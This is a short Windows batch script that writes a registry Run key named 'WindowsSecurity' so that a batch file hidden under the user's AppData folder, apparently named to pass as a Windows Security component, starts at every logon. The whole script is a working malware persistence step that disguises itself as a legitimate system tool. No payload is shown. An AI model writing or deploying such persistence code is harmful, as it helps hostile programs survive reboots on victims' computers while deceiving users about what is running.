@echo off
setlocal
set "batPath=%appdata%\windows security\windowssecurity.bat"
REM Add the batch file to the registry Run key for current user
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsSecurity" /t REG_SZ /d "\"%batPath%\"" /f
exit
